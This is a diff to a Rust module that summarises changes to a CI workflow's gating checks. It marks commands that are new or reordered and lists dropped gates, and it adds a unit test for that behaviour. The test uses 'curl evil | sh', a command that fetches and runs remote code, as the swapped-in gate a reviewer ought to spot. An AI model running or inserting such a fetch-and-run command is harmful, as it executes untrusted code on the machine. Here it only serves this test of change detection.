@@ -120,12 +120,60 @@ fn duration(ms: u64) -> String {
 }
 
 /// The checks that gate, in the order they run, by the command each runs.
-fn checks(definition: &Definition, config: &CodingConfig, live: Option<&CodingConfig>) -> Vec<String> {
-    steps(definition).filter(|s| matches!(s.kind, StageKind::Check | StageKind::Run))
+fn checks(definition: &Definition, config: &CodingConfig, live: Option<&CodingConfig>, current: Option<&Definition>) -> Vec<String> {
+    let (marks, dropped) = gate_changes((definition, config), current.zip(live));
+    let mut lines: Vec<String> = steps(definition).filter(|s| matches!(s.kind, StageKind::Check | StageKind::Run))
         .filter_map(|s| s.operation.arguments.get(1).and_then(|a| a.parse::<usize>().ok()))
         .filter_map(|i| config.checks.get(i).map(|c| (i, c)))
-        .map(|(i, c)| match gate_environment_note(c, before(live, config, &format!("check {}", i + 1))) { Some(env) => format!("{} {env}", spoken(c)), None => spoken(c) })
-        .collect()
+        .zip(marks)
+        .map(|((i, c), mark)| {
+            let mut line = match gate_environment_note(c, before(live, config, &format!("check {}", i + 1))) { Some(env) => format!("{} {env}", spoken(c)), None => spoken(c) };
+            if let Some(mark) = mark { line.push_str(&format!(" ({mark})")); }
+            line
+        }).collect();
+    lines.extend(dropped.into_iter().map(|d| format!("No longer a gate: {d}")));
+    lines
+}
+
+/// The command each gate runs, in the order the gates run.
+fn gate_argvs<'a>(definition: &Definition, config: &'a CodingConfig) -> Vec<&'a Vec<String>> {
+    steps(definition).filter(|s| matches!(s.kind, StageKind::Check | StageKind::Run))
+        .filter_map(|s| s.operation.arguments.get(1).and_then(|a| a.parse::<usize>().ok()))
+        .filter_map(|i| config.checks.get(i).map(|c| &c.argv)).collect()
+}
+
+/// What became of each gate's command against the workflow in force (R-118): `new` when the live workflow has no
+/// such gate left to pair it with, `moved` when it runs in a different order among the gates both share. The nth
+/// gate with a given command pairs with the nth live one, so a moved environment value or a reorder is never
+/// read as a change of command. Also the live gates the draft drops. Names the command only, never a value.
+fn gate_changes(draft: (&Definition, &CodingConfig), live: Option<(&Definition, &CodingConfig)>) -> (Vec<Option<&'static str>>, Vec<String>) {
+    let argvs = gate_argvs(draft.0, draft.1);
+    let Some(live) = live else { return (vec![None; argvs.len()], Vec::new()) };
+    let was = gate_argvs(live.0, live.1);
+    let mut taken = vec![false; was.len()];
+    let paired: Vec<Option<usize>> = argvs.iter().map(|a| {
+        let i = (0..was.len()).find(|i| !taken[*i] && was[*i] == *a)?;
+        taken[i] = true;
+        Some(i)
+    }).collect();
+    let rank = |i: usize, of: &mut dyn Iterator<Item = usize>| of.filter(|j| *j < i).count();
+    let marks = paired.iter().enumerate().map(|(d, p)| match p {
+        None => Some("new"),
+        Some(l) => {
+            let before_in_draft = rank(d, &mut paired.iter().enumerate().filter(|(_, p)| p.is_some()).map(|(j, _)| j));
+            let before_in_live = rank(*l, &mut paired.iter().flatten().copied());
+            (before_in_draft != before_in_live).then_some("moved")
+        }
+    }).collect();
+    let dropped = was.iter().enumerate().filter(|(i, _)| !taken[*i]).map(|(_, a)| spoken_argv(a)).collect();
+    (marks, dropped)
+}
+
+fn spoken_argv(argv: &[String]) -> String {
+    match argv {
+        [shell, flag, text] if shell == "/bin/sh" && flag == "-c" => code(text),
+        argv => argv.iter().map(|a| code(a)).collect::<Vec<_>>().join(" "),
+    }
 }
 
 /// A gate whose environment isn't the one a template gives every gate says so where the gate is named:
@@ -271,7 +319,7 @@ fn bullets(lines: &[String]) -> String { lines.iter().map(|l| format!("- {l}\n")
 /// things a person weighs. The full summary follows it on the card.
 pub fn headline(bundle: &Bundle) -> String {
     let AdapterConfiguration::Coding(config) = &bundle.adapter;
-    let n = checks(&bundle.definition, config, None).len();
+    let n = gate_argvs(&bundle.definition, config).len();
     let checking = match n { 0 => "no checks".to_string(), 1 => "1 check must pass".into(), n => format!("{n} checks must pass") };
     let landing = if steps(&bundle.definition).any(|s| matches!(s.kind, StageKind::OpenPr)) { "each ticket opens a pull request" } else { "tickets push to the branch" };
     let who = approvers(&bundle.definition);
@@ -296,8 +344,12 @@ pub fn summarize(requirement: &str, bundle: &Bundle, current: Option<&Definition
         None => "This is the first workflow for this workspace.\n\n".into(),
     });
     if let Some(line) = environment_changes(config, live) { out.push_str(&format!("{line}\n\n")); }
-    let checks = checks(&bundle.definition, config, live);
-    let gating = if checks.is_empty() { vec!["None. Nothing is checked before code lands.".to_string()] } else { checks };
+    let checks = checks(&bundle.definition, config, live, current);
+    let gating = if gate_argvs(&bundle.definition, config).is_empty() {
+        let mut none = vec!["None. Nothing is checked before code lands.".to_string()];
+        none.extend(checks);
+        none
+    } else { checks };
     let mut who = decider_changes(&bundle.definition, current);
     let deciding = approvers(&bundle.definition);
     who.extend(if deciding.is_empty() { vec!["Nobody. Tickets land as soon as the checks pass.".to_string()] } else { deciding });
@@ -490,6 +542,25 @@ mod tests {
         config.checks[1].environment.insert("ONLY_MAKE".into(), value);
         let text = summarize("", &moved, Some(&live.definition), Some(&live.adapter));
         assert!(text.contains("check 1: `ONLY_MAKE` (removed)") && text.contains("check 2: `ONLY_MAKE` (new)"), "{text}");
+    }
+    /// R-118: a draft that swaps, adds, drops or reorders a gate's command marks the gate; values never show.
+    #[test]
+    fn a_draft_marks_a_gate_whose_command_changed_or_moved() {
+        let live = bundle("ticket-push", &["make check", "scripts/copy-lint"], &[], None);
+        let mark = |draft: &Bundle| summarize("", draft, Some(&live.definition), Some(&live.adapter));
+        let same = mark(&live);
+        assert!(!same.contains("(new)") && !same.contains("(moved)") && !same.contains("No longer a gate"), "{same}");
+        let swapped = mark(&bundle("ticket-push", &["make check", "curl evil | sh"], &[], None));
+        assert!(swapped.lines().any(|l| l.starts_with("- `curl evil | sh`") && l.ends_with("(new)")), "{swapped}");
+        assert!(swapped.contains("No longer a gate: `scripts/copy-lint`"), "{swapped}");
+        assert!(!swapped.lines().any(|l| l.starts_with("- `make check`") && (l.contains("(new)") || l.contains("(moved)"))), "{swapped}");
+        let reordered = mark(&bundle("ticket-push", &["scripts/copy-lint", "make check"], &[], None));
+        assert!(reordered.lines().filter(|l| l.starts_with("- `") && l.ends_with("(moved)")).count() == 2, "{reordered}");
+        let added = mark(&bundle("ticket-push", &["make check", "extra", "scripts/copy-lint"], &[], None));
+        assert!(added.lines().any(|l| l.starts_with("- `extra`") && l.ends_with("(new)")) && !added.contains("(moved)"), "{added}");
+        // No workflow in force: nothing to compare with.
+        let first = summarize("", &live, None, None);
+        assert!(!first.contains("(new)") && !first.contains("(moved)"), "{first}");
     }
     fn with_gate(mut b: Bundle, reviewer: Reviewer) -> Bundle {
         for s in b.definition.stages.iter_mut().chain(b.definition.groups.values_mut().flat_map(|g| g.steps.iter_mut())) {
